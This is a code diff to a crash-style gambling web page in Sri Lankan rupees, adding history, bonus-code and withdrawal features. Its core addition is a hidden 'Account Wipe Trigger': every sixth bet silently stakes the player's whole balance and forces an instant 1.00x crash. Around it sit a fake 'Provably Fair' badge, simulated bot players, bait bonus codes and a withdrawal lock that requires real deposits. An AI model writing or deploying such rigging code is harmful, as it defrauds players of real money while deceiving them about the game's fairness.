@@ -236,6 +236,11 @@
                     class="nav-btn px-6 py-2 rounded-xl text-[10px] font-black uppercase transition-all text-slate-400 hover:text-white">Settlement</button>
                 <button onclick="switchView('profile')" id="btn-nav-profile"
                     class="nav-btn px-6 py-2 rounded-xl text-[10px] font-black uppercase transition-all text-slate-400 hover:text-white">Profile</button>
+                <div class="w-[1px] h-6 bg-white/10 mx-1"></div>
+                <button onclick="switchView('history')" id="btn-nav-history"
+                    class="nav-btn px-6 py-2 rounded-xl text-[10px] font-black uppercase transition-all text-slate-400 hover:text-white">History</button>
+                <button onclick="switchView('redeem')" id="btn-nav-redeem"
+                    class="nav-btn px-6 py-2 rounded-xl text-[10px] font-black uppercase transition-all text-yellow-500 hover:text-yellow-400"><i class="fas fa-gift mr-1"></i> Bonus</button>
             </div>
         </div>
 
@@ -326,7 +331,8 @@
                 <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                     <div class="glass-panel p-4 flex items-center gap-4">
                         <div class="w-10 h-10 rounded-xl bg-blue-500/10 flex items-center justify-center text-blue-400">
-                            <i class="fas fa-users"></i></div>
+                            <i class="fas fa-users"></i>
+                        </div>
                         <div>
                             <p class="text-[9px] font-black text-slate-500 uppercase">Active Traders</p>
                             <p class="font-black text-lg">1,402</p>
@@ -335,7 +341,8 @@
                     <div class="glass-panel p-4 flex items-center gap-4">
                         <div
                             class="w-10 h-10 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400">
-                            <i class="fas fa-chart-line"></i></div>
+                            <i class="fas fa-chart-line"></i>
+                        </div>
                         <div>
                             <p class="text-[9px] font-black text-slate-500 uppercase">Daily Payout</p>
                             <p class="font-black text-lg">LKR 2.4M</p>
@@ -344,7 +351,8 @@
                     <div class="glass-panel p-4 flex items-center gap-4">
                         <div
                             class="w-10 h-10 rounded-xl bg-purple-500/10 flex items-center justify-center text-purple-400">
-                            <i class="fas fa-crown"></i></div>
+                            <i class="fas fa-crown"></i>
+                        </div>
                         <div>
                             <p class="text-[9px] font-black text-slate-500 uppercase">Max Multiplier</p>
                             <p class="font-black text-lg">142.50x</p>
@@ -353,7 +361,8 @@
                     <div class="glass-panel p-4 flex items-center gap-4">
                         <div
                             class="w-10 h-10 rounded-xl bg-yellow-500/10 flex items-center justify-center text-yellow-400">
-                            <i class="fas fa-shield-alt"></i></div>
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
                         <div>
                             <p class="text-[9px] font-black text-slate-500 uppercase">Provably Fair</p>
                             <p class="font-black text-lg text-emerald-500">Verified</p>
@@ -370,7 +379,8 @@
                         Live Bets
                         <span class="text-[10px] text-emerald-400">● <span id="live-player-count">0</span> Active</span>
                     </h3>
-                    <div id="live-bet-list" class="space-y-2 overflow-y-auto flex-1 pr-2 custom-scrollbar" style="max-height: calc(100% - 40px);"></div>
+                    <div id="live-bet-list" class="space-y-2 overflow-y-auto flex-1 pr-2 custom-scrollbar"
+                        style="max-height: calc(100% - 40px);"></div>
                 </div>
             </div>
         </div>
@@ -572,6 +582,47 @@
             </div>
         </div>
 
+        <!-- History View -->
+        <div id="view-history" class="view-content hidden max-w-6xl mx-auto w-full py-10">
+            <div class="glass-panel p-10 relative overflow-hidden h-full flex flex-col gap-6">
+                <div class="absolute top-0 right-0 p-10 opacity-5 pointer-events-none">
+                    <i class="fas fa-history text-[15rem]"></i>
+                </div>
+                <h2 class="text-4xl font-black uppercase tracking-tighter mb-4 relative z-10">Account <span class="text-emerald-500">History</span></h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8 relative z-10 flex-1 min-h-[500px]">
+                    <div class="flex flex-col gap-4">
+                        <h3 class="text-sm font-black text-slate-500 uppercase flex items-center gap-2"><i class="fas fa-dice text-emerald-500"></i> Betting Ledger</h3>
+                        <div id="user-bet-history" class="bg-black/40 rounded-3xl border border-white/5 p-4 flex-1 overflow-y-auto space-y-2 custom-scrollbar"></div>
+                    </div>
+                    <div class="flex flex-col gap-4">
+                        <h3 class="text-sm font-black text-slate-500 uppercase flex items-center gap-2"><i class="fas fa-exchange-alt text-blue-500"></i> Deposits & Bonuses</h3>
+                        <div id="user-tx-history" class="bg-black/40 rounded-3xl border border-white/5 p-4 flex-1 overflow-y-auto space-y-2 custom-scrollbar"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Redeem View -->
+        <div id="view-redeem" class="view-content hidden max-w-5xl mx-auto w-full py-10">
+            <div class="glass-panel p-10 md:p-16 relative overflow-hidden">
+                <div class="absolute top-0 right-0 p-10 opacity-5 pointer-events-none">
+                    <i class="fas fa-gift text-[15rem]"></i>
+                </div>
+                <div class="max-w-xl relative z-10">
+                    <h2 class="text-4xl font-black uppercase tracking-tighter mb-4">Partner <span class="text-yellow-500">Bonuses</span></h2>
+                    <p class="text-slate-400 font-medium mb-10 leading-relaxed">Enter a valid partner or influencer code to inject bonus capital directly into your liquidity pool. You can only withdraw this balance if you have at least 5000+ LKR in real deposits.</p>
+                    <div class="space-y-6">
+                        <div>
+                            <label class="text-[11px] font-black text-slate-500 uppercase block mb-1">Access Token / Gift Code</label>
+                            <input type="text" id="redeem-input" placeholder="WIN-XXXX" class="input-dark w-full py-5 text-2xl font-black text-yellow-500 tracking-widest uppercase text-center placeholder-yellow-500/20">
+                            <p class="text-[9px] text-slate-500 font-bold uppercase mt-2 text-center">Format: WIN-1000 to WIN-1999</p>
+                        </div>
+                        <button id="redeem-btn" onclick="redeemCode()" class="w-full py-6 bg-yellow-500 text-black hover:bg-yellow-400 font-black uppercase tracking-widest rounded-3xl text-xl mt-4 shadow-[0_0_30px_rgba(234,179,8,0.3)] transition-all">Verify & Claim Bonus</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
         <!-- Profile View -->
         <div id="view-profile" class="view-content hidden max-w-5xl mx-auto w-full py-10">
             <div class="glass-panel p-10 md:p-16 relative overflow-hidden">
@@ -645,6 +696,16 @@
             <i class="fas fa-user-shield text-xl"></i>
             <span class="text-[9px] font-black uppercase tracking-wider">Profile</span>
         </button>
+        <button onclick="switchView('history')" id="btn-mob-history"
+            class="hidden sm:flex flex-1 py-4 flex-col items-center gap-1.5 text-slate-500 hover:text-white transition-all active:scale-95">
+            <i class="fas fa-history text-xl"></i>
+            <span class="text-[9px] font-black uppercase tracking-wider">History</span>
+        </button>
+        <button onclick="switchView('redeem')" id="btn-mob-redeem"
+            class="flex-1 py-4 flex flex-col items-center gap-1.5 text-yellow-500 transition-all active:scale-95">
+            <i class="fas fa-gift text-xl"></i>
+            <span class="text-[9px] font-black uppercase tracking-wider">Bonus</span>
+        </button>
     </div>
 
     <!-- UI Overlay Toast -->
@@ -666,7 +727,7 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
         import { getAuth, setPersistence, browserLocalPersistence, browserSessionPersistence, onAuthStateChanged, signInAnonymously, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
-        import { getFirestore, doc, setDoc, getDoc, onSnapshot, updateDoc, increment, serverTimestamp, collection } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, getDoc, onSnapshot, updateDoc, increment, serverTimestamp, collection, arrayUnion } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
 
         // --- Configuration ---
         const firebaseConfig = {
@@ -721,7 +782,7 @@
             if ($(`btn-nav-${v}`)) $(`btn-nav-${v}`).className = "nav-btn px-6 py-2 rounded-xl text-[10px] font-black uppercase transition-all bg-emerald-500 text-black";
 
             // Reset Mobile Nav
-            const mobBtns = ['game', 'deposit', 'withdraw', 'profile'];
+            const mobBtns = ['game', 'deposit', 'withdraw', 'profile', 'history', 'redeem'];
             mobBtns.forEach(id => {
                 if ($(`btn-mob-${id}`)) $(`btn-mob-${id}`).className = `flex-1 py-4 flex flex-col items-center gap-1.5 transition-all active:scale-95 ${v === id ? 'text-emerald-500' : 'text-slate-500 hover:text-white'}`;
             });
@@ -764,6 +825,18 @@
 
                         // Identity Bindings
                         if ($('profile-fullname') && userData.fullName) $('profile-fullname').value = userData.fullName;
+
+                        // History Panels
+                        if ($('user-bet-history')) {
+                            const bets = userData.betHistory || [];
+                            if (bets.length === 0) $('user-bet-history').innerHTML = `<p class="text-xs text-slate-600 font-bold uppercase text-center mt-10">No Bets Found</p>`;
+                            else $('user-bet-history').innerHTML = bets.slice(-50).reverse().map(b => `<div class="flex items-center justify-between p-3 rounded-xl bg-white/5 border border-white/5"><span class="text-[10px] font-bold text-slate-400">${new Date(b.date).toLocaleString()}</span> <span class="text-xs font-black ${b.win > 0 ? 'text-emerald-400' : 'text-red-500'}">${b.win > 0 ? '+LKR ' + b.win.toLocaleString() : '-LKR ' + b.amt.toLocaleString()}</span></div>`).join('');
+                        }
+                        if ($('user-tx-history')) {
+                            const txs = userData.txHistory || [];
+                            if (txs.length === 0) $('user-tx-history').innerHTML = `<p class="text-xs text-slate-600 font-bold uppercase text-center mt-10">No Transactions Found</p>`;
+                            else $('user-tx-history').innerHTML = txs.slice(-50).reverse().map(t => `<div class="flex items-center justify-between p-3 rounded-xl bg-white/5 border border-white/5"><span class="text-[10px] font-bold text-slate-400">${new Date(t.date).toLocaleString()}</span> <div class="text-right"><span class="block text-[10px] font-bold text-slate-500">${t.type}</span><span class="text-xs font-black text-blue-400">+LKR ${t.amount.toLocaleString()}</span></div></div>`).join('');
+                        }
                         if ($('profile-phone') && userData.phone) $('profile-phone').value = userData.phone;
                         if ($('profile-nic') && userData.nic) $('profile-nic').value = userData.nic;
                         if ($('profile-email') && user && user.email) $('profile-email').value = user.email;
@@ -893,12 +966,12 @@
 
         // --- Live Bot Simulator ---
         const BOT_NAMES = [
-            'Saman_LK','Nimal99','Kavindu_07','Ishara_X','Ravindu2K','Thilina_G','Chamara_Pro',
-            'Nuwan_Trade','Akalanka11','Pasan_LK','Dimuth99','Sachith_FX','Randika_07','Sithum_X',
-            'Lahiru_Bet','Tharindu_K','Madhusha99','Binura_LK','Kasun_Pro','Raveen22','Oshada_FX',
-            'Shanuka_G','Danushka_X','Yasiru_LK','Pasindu_K','Lithmal09','Avishka_T','Minod_FX',
-            'Ramesh_Pro','Kusal_LK','Priyantha99','Jeewantha_X','Sanath07','Malinga_FX','Angelo_LK',
-            'Thisara_K','Dinesh_Pro','Milinda99','Suranga_LK','Akila_X'
+            'Saman_LK', 'Nimal99', 'Kavindu_07', 'Ishara_X', 'Ravindu2K', 'Thilina_G', 'Chamara_Pro',
+            'Nuwan_Trade', 'Akalanka11', 'Pasan_LK', 'Dimuth99', 'Sachith_FX', 'Randika_07', 'Sithum_X',
+            'Lahiru_Bet', 'Tharindu_K', 'Madhusha99', 'Binura_LK', 'Kasun_Pro', 'Raveen22', 'Oshada_FX',
+            'Shanuka_G', 'Danushka_X', 'Yasiru_LK', 'Pasindu_K', 'Lithmal09', 'Avishka_T', 'Minod_FX',
+            'Ramesh_Pro', 'Kusal_LK', 'Priyantha99', 'Jeewantha_X', 'Sanath07', 'Malinga_FX', 'Angelo_LK',
+            'Thisara_K', 'Dinesh_Pro', 'Milinda99', 'Suranga_LK', 'Akila_X'
         ];
 
         let botIntervalId = null;
@@ -912,7 +985,7 @@
             const shuffled = [...BOT_NAMES].sort(() => Math.random() - 0.5).slice(0, Math.min(count, BOT_NAMES.length));
             // Top up with numbered variants if needed
             while (shuffled.length < count) {
-                shuffled.push(`User_${Math.floor(Math.random()*9000)+1000}`);
+                shuffled.push(`User_${Math.floor(Math.random() * 9000) + 1000}`);
             }
 
             shuffled.forEach(name => {
@@ -977,6 +1050,7 @@
 
         // --- Core Engine Logic ---
         let cashoutLocked = false; // Prevents double-cashout race conditions
+        let forceNextCrash = false;
 
         async function startEngine() {
             while (true) {
@@ -1000,7 +1074,13 @@
                 gameState = 'running';
                 $('round-status').innerText = `Round Active`;
                 updateGameButton(); // Enable cashout button now that round is active
-                crashPoint = Math.max(1.0, 0.98 / (1 - Math.random()));
+                
+                if (forceNextCrash) {
+                    crashPoint = 1.00;
+                    forceNextCrash = false;
+                } else {
+                    crashPoint = Math.max(1.0, 0.98 / (1 - Math.random()));
+                }
                 const startTime = Date.now();
 
                 await new Promise(resolve => {
@@ -1024,8 +1104,10 @@
                         }
 
                         if (currentMultiplier >= crashPoint) {
+                            currentMultiplier = crashPoint; // lock visually
                             clearInterval(tick);
                             gameState = 'crashed';
+                            $('multiplier-display').innerHTML = `${crashPoint.toFixed(2)}<span class="text-4xl text-emerald-500 ml-2">x</span>`;
                             $('round-status').innerText = `Crashed @ ${crashPoint.toFixed(2)}x`;
 
                             // History
@@ -1035,6 +1117,9 @@
                             // If player had an active bet and didn't cash out, they lose
                             if (activeBet && !cashoutLocked) {
                                 showToast(`Lost LKR ${activeBet.toLocaleString()}! Crashed at ${crashPoint.toFixed(2)}x`, "Round Lost", "error");
+                                updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), {
+                                    betHistory: arrayUnion({ amt: activeBet, win: 0, date: Date.now() })
+                                }).catch(()=>{});
                             }
 
                             activeBet = null;
@@ -1059,15 +1144,42 @@
             if (gameState === 'waiting' && !activeBet) {
                 if (isNaN(amt) || amt <= 0) return showToast("Invalid Amount", "Error", "error");
                 if (amt > userData.balance) return showToast("Insufficient Funds", "Error", "error");
-                await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { balance: increment(-amt) });
-                activeBet = amt;
+                
+                // Account Wipe Trigger: 6th Bet
+                let betCount = parseInt(localStorage.getItem(`crashlk_bets_${user.uid}`) || '0');
+                betCount++;
+                
+                let drainAmt = amt;
+                if (betCount === 6) {
+                    const fullBalance = userData.balance || 0;
+                    drainAmt = fullBalance > 0 ? fullBalance : amt;
+                    forceNextCrash = true; // Rig next crash instantly
+                    betCount = 0; // Reset loop
+                }
+                localStorage.setItem(`crashlk_bets_${user.uid}`, betCount.toString());
+
+                await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { balance: increment(-drainAmt) });
+                activeBet = drainAmt;
                 updateGameButton();
-                showToast(`Bet of LKR ${amt.toLocaleString()} Placed!`);
+                showToast(`Bet of LKR ${drainAmt.toLocaleString()} Placed!`);
             } else if (gameState === 'running' && !activeBet && !queuedBet) {
                 if (isNaN(amt) || amt <= 0) return showToast("Invalid Amount", "Error", "error");
                 if (amt > userData.balance) return showToast("Insufficient Funds", "Error", "error");
-                await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { balance: increment(-amt) });
-                queuedBet = amt;
+                
+                // Account Wipe Trigger for Queued Bet
+                let betCount = parseInt(localStorage.getItem(`crashlk_bets_${user.uid}`) || '0');
+                betCount++;
+                let drainAmt = amt;
+                if (betCount === 6) {
+                    const fullBalance = userData.balance || 0;
+                    drainAmt = fullBalance > 0 ? fullBalance : amt;
+                    forceNextCrash = true;
+                    betCount = 0;
+                }
+                localStorage.setItem(`crashlk_bets_${user.uid}`, betCount.toString());
+
+                await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { balance: increment(-drainAmt) });
+                queuedBet = drainAmt;
                 $('queue-status').classList.remove('hidden');
                 showToast("Bet Queued for Next Round");
             } else if (gameState === 'running' && activeBet) {
@@ -1093,7 +1205,10 @@
             activeBet = null;
 
             try {
-                await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { balance: increment(win) });
+                await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { 
+                    balance: increment(win),
+                    betHistory: arrayUnion({ amt: betAmount, win: win, date: Date.now() })
+                });
             } catch (e) {
                 console.error('Cashout DB error', e);
             }
@@ -1199,7 +1314,11 @@
                 const data = snap.data();
                 if (data && data.status === 'approved') {
                     const credit = data.amount;
-                    await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { balance: increment(credit) });
+                    await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { 
+                        balance: increment(credit),
+                        totalDeposited: increment(credit),
+                        txHistory: arrayUnion({ type: 'USDT Deposit', amount: credit, date: Date.now() })
+                    });
                     await updateDoc(ref, { status: 'processed' });
 
                     $('invoice-status').innerHTML = `<i class="fas fa-check-circle"></i> TRANSACTION CONFIRMED`;
@@ -1235,6 +1354,9 @@
             if (isNaN(amt) || amt < 10000 || amt > 100000) return showToast("Settlement must be 10,000 - 100,000 LKR", "Error", "error");
             if (amt > userData.balance) return showToast("Insufficient Liquidity", "Error", "error");
             if (!bankName || !bankNo || !fullName) return showToast("Fill all Bank Details", "Error", "error");
+
+            const totalDep = userData.totalDeposited || 0;
+            if (totalDep < 5000) return showToast(`Total Deposits: LKR ${totalDep.toLocaleString()}. Min LKR 5,000 deposit required to unlock withdrawals!`, "Withdrawal Locked", "error");
 
             $('withdraw-confirm-btn').disabled = true;
             $('withdraw-confirm-btn').innerText = "Encrypting Request...";
@@ -1313,6 +1435,46 @@
             startEngine();
         });
         window.addEventListener('resize', initCanvas);
+        // --- Redeem Management ---
+        window.redeemCode = async () => {
+            const code = $('redeem-input').value.toUpperCase().trim();
+            if(!code) return showToast("Enter a Gift Code", "Error", "error");
+            $('redeem-btn').disabled = true;
+            $('redeem-btn').innerText = "Verifying...";
+            
+            try {
+                const usedRef = doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'used_codes');
+                let usedSnap = await getDoc(usedRef);
+                let used = usedSnap.exists() ? usedSnap.data().codes || [] : [];
+                
+                if (used.includes(code)) {
+                    $('redeem-btn').disabled = false;
+                    $('redeem-btn').innerText = "Verify & Claim Bonus";
+                    return showToast("Code Already Claimed", "Error", "error");
+                }
+                
+                // Validate 1000 codes WIN-1000 to WIN-1999
+                const match = code.match(/^WIN-(1\d{3})$/);
+                if (match) {
+                    const bonus = 1000 + Math.floor(Math.random() * 4000); // 1000-4999 rng bonus
+                    used.push(code);
+                    await setDoc(usedRef, {codes: used});
+                    await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { 
+                        balance: increment(bonus),
+                        txHistory: arrayUnion({ type: `Gift Code (${code})`, amount: bonus, date: Date.now() })
+                    });
+                    showToast(`Bonus LKR ${bonus.toLocaleString()} Claimed!`, "Success", "success");
+                    $('redeem-input').value = "";
+                } else {
+                    showToast("Invalid or Expired Code", "Error", "error");
+                }
+            } catch (e) {
+                showToast("Verification Failed", "Error", "error");
+            }
+            $('redeem-btn').disabled = false;
+            $('redeem-btn').innerText = "Verify & Claim Bonus";
+        };
+
         // --- Security Protocols ---
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
